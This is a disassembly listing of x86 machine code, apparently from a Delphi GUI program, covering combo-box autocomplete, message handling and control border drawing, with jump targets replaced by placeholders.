mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_443830
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4041e0
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40c218
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_44d18c
mov eax [ ebp - 0x38 ]
call sub_4041e0
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40338c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44282c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4041e0
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404480
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4041e0
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404480
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44d18c
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442850
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_443804
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44282c
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40c218
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404108
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_40422c
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_404440
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404108
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_40422c
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_442850
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404440
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_404440
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_40422c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_44d1bc
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406b34
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44d18c
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f74
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_443cc0
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404108
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_40422c
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_443cc0
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_443cc0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443e75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4041e0
test eax eax
jne r-xdata
mov eax esi
call sub_4043e0
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_40338c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e7c
lea eax [ ebp - 0x1c ]
call sub_403f20
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403f44
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_403f74
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_4041e0
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_404440
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_40422c
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_44d1bc
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x1c ]
call sub_4041e0
push eax
mov eax esi
call sub_4041e0
pop edx
call sub_406b34
push eax
push 0x0
push 0x142
mov eax ebx
call sub_453a88
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_40338c
mov eax ebx
mov si 0xffb2
call sub_40338c
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_443ea8
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_424a8c
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_42492c
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_424948
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_4245b0
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_42420c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a40
xor edx edx
mov eax [ esi + 0x208 ]
call sub_424a8c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_443f80
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_443fac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e810
mov eax ebx
call sub_44d3b4
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_464518
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44d834
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44d3c4
sub_444024
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_442e18
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424240
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_444080
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_451c18
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4442a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bd68
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42420c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4245ec
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4245ec
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403190
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44cb2c
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42420c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4245ec
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4245ec
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_44282c
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call DrawFrameControl
jmp r-xdata
sub_4442bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f780
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_4442e0
push ebx
mov ebx eax
mov eax ebx
call sub_4598b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444318
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_44436e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_44437c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f7b4
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4443d0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_454558
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_444424
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_444448
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_45149c
mov eax ebx
mov si 0xffb5
call sub_40338c
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_453a88
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_40338c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4444c0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43c850
mov ebx eax
mov eax ebx
call sub_43c930
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_453a88
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43cac8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44450c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_451edc
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_444538
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450914
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_444570
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44437c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_44c948
mov edx 0x19
mov eax esi
call sub_44c96c
mov dl 0x1
mov eax esi
call sub_453cbc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4445fc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_453d8c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_453a88
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_453a88
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_444650
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_464518
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44e340
sub_444684
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444538
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450840
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4446ec
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_452f04
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_464420
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40338c
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_444759
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4447d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d18c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4644a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_452f0c
mov eax ebx
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40338c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4447d9
sub_4447e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_452f14
pop edi
pop esi
pop ebx
retn
sub_444834
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_444860
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43c850
mov ebx eax
mov eax ebx
call sub_43c930
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_453a88
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43cac8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4448ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44437c
mov edx 0x71
mov eax esi
call sub_44c948
mov edx 0x11
mov eax esi
call sub_44c96c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_444914
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_444954
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_45077c
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_459b48
sub_444a10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_453cbc
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
push ebp
call sub_444954
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44cd98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40338c
sub_444a9c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_444538
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_450840
mov eax ebx
mov si 0xffc8
call sub_40338c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_444af3
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x40bd173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_444b28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444b9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d18c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4644a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_452f0c
mov eax ebx
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444ba4
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_444bac
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40338c
jmp r-xdata
pop esi
retn
sub_444bf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444cbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_453a88
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4468ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40456c
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c50
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_41982c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444cc3
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4043e0
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40456c
sub_444ccc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_444d4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_40338c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4468cc
